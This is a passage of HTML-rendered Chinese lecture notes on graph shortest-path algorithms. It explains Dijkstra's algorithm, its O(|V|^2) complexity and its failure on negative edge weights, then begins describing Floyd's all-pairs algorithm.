mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">rcs</span><span class="mopen">[</span><span class="mord">0</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord">2</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6944em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span></span></span></span></li>
<li>从顶点集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>−</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">V - S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 中选出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，满足 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>=</mo><mi>M</mi><mi>i</mi><mi>n</mi><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mi mathvariant="normal">∣</mi><msub><mi>v</mi><mi>i</mi></msub><mo>∈</mo><mi>V</mi><mo>−</mo><mi>S</mi></mrow></mrow><annotation encoding="application/x-tex">dist[j] = Min{dist[i] | v_{i} \in V - S}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal">in</span><span class="mord"><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal">i</span><span class="mclose">]</span><span class="mord">∣</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span></span>，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 就是当前求得的一条从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 出发的最短路径的终点，令 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi><mo>=</mo><mi>S</mi><mo>∪</mo><mi>j</mi></mrow><annotation encoding="application/x-tex">S = S \cup {j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">∪</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.854em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05724em;">j</span></span></span></span></span></li>
<li>修改从 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 出发到集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>−</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">V - S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 上任意一个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">v_{k}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 可达的最短路径长度：若 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>+</mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>s</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>&lt;</mo><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">dist[j] + arcs[j][k] &lt; dist[k]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">rcs</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span></span></span></span>，则更新 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo><mo>=</mo><mi>d</mi><mi>i</mi><mi>s</mi><mi>t</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo>+</mo><mi>a</mi><mi>r</mi><mi>c</mi><mi>s</mi><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>k</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">dist[k] = dist[j] + arcs[j][k]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">i</span><span class="mord mathnormal">s</span><span class="mord mathnormal">t</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mord mathnormal">rcs</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.05724em;">j</span><span class="mclose">]</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mclose">]</span></span></span></span></li>
<li>重复 <code>2~3</code> 操作共 <code>n - 1</code> 次，直到所有的顶点都包含在 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 中</li>
</ol>
<p>步骤 <code>3</code>，每当一个顶点加入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 后，可能需要修改源点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mn>0</mn></msub></mrow><annotation encoding="application/x-tex">v_{0}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 到集合 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>−</mo><mi>S</mi></mrow><annotation encoding="application/x-tex">V - S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 中可达顶点当前的最短路径长度。</p>
<p>显然，<code>Dijkstra</code> 算法也是基于贪心策略的。使用邻接矩阵表示时，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。使用带权的邻接表表示时，虽然修改 <code>dist[]</code> 的时间可以减少，但由于在 <code>dist[]</code> 中选择最小分量的时间不变，时间复杂度仍为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p>
<p>如果只希望找到从源点到某个特定顶点的最短路径，但这个问题和求解源点到其他所有顶点的最短路径一样复杂，时间复杂度也为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi mathvariant="normal">∣</mi><mi>V</mi><msup><mi mathvariant="normal">∣</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(|V|^{2})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0641em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mord"><span class="mord">∣</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span>。</p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>边上带有负权值时，<code>Dijkstra</code> 算法并不适用。若允许边上带有负权值，则在与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span>（已求得最短路径的顶点集，归入 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>S</mi></mrow><annotation encoding="application/x-tex">S</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">S</span></span></span></span> 内的结点的最短路径不再变更）内某点（记为 <code>a</code>）以负边相连的点（记为 <code>b</code>）确定其最短路径时，其最短路径长度加上这条负边的权值结果可能小于 <code>a</code> 原先确定的最短路径长度，而此时 <code>a</code> 在 <code>Dijkstra</code> 算法下是无法更新的</p>
</div>
</li>
<li>
<p><strong>Floyd 算法求各顶点之间最短路径问题</strong></p>
<p>求所有顶点之间的最短路径问题描述如下：己知一个各边权值均大于 <code>0</code> 的带权有向图，对任意两个顶点 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub><mo mathvariant="normal">≠</mo><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{i} \ne v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel"><span class="mrel"><span class="mord vbox"><span class="thinbox"><span class="rlap"><span class="strut" style="height:0.8889em;vertical-align:-0.1944em;"></span><span class="inner"><span class="mord"><span class="mrel"></span></span></span><span class="fix"></span></span></span></span></span><span class="mrel">=</span></span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span>，要求求出 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">v_{i}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 与 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>v</mi><mi>j</mi></msub></mrow><annotation encoding="application/x-tex">v_{j}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7167em;vertical-align:-0.2861em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">v</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span></span></span></span></span></span></span></span></span></span> 之间的最短路径和最短路径长度。</p>
<p><code>Floyd</code> 算法的 <strong>基本思想</strong> 是：递推产生一个 <code>n</code> 阶方阵序列 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mn>0</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><mo>…</mo><mo separator="true">,</mo><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>n</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow></msup></mrow><annotation encoding="application/x-tex">A^{(-1)}, A^{(0)}, \dotsc, A^{(k)}, \dotsc, A^{(n-1)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0824em;vertical-align:-0.1944em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">0</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="minner">…</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight">n</span><span class="mbin mtight">−</span><span class="mord mtight">1</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span></span></span></span>，其中 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>A</mi><mrow><mo stretchy="false">(</mo><mi>k</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">[</mo><mi>i</mi><mo stretchy="false">]</mo><mo stretchy="false">[</mo><mi>j</mi><mo stretchy="false">]</mo></mrow><annotation encoding="application/x-tex">A^{(k)}[i][j]</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.138em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">A</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.888em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span><span class="mclose 